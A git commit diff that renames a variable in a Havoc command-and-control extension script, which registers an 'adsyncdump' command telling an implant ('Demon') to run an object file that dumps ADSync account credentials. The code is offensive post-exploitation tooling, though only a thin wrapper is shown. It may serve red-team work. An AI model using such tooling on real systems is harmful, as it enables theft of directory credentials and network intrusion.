2857f422bef92048485690623b4fea73eaa7d808
qmadev <190383216+qmadev@users.noreply.github.com>
2025-09-03 14:09:31 +0200

    Change var name

--- adsyncdump.py
+++ adsyncdump.py
@@ -3,10 +3,10 @@ from havoc import Demon, RegisterCommand
 
 def adsyncdump(demon_id, *param):
     demon = Demon(demon_id)
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to dump ADSync credentials" )
-    demon.InlineExecute(TaskID, "go", f"adsyncdump.{demon.ProcessArch}.o", b"", False)
+    task_id = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to dump ADSync credentials" )
+    demon.InlineExecute(task_id, "go", f"adsyncdump.{demon.ProcessArch}.o", b"", False)
 
-    return TaskID
+    return task_id
 
 
 RegisterCommand(adsyncdump, "", "adsyncdump", "Dump credentials of the ADSync account", 0, "", "")
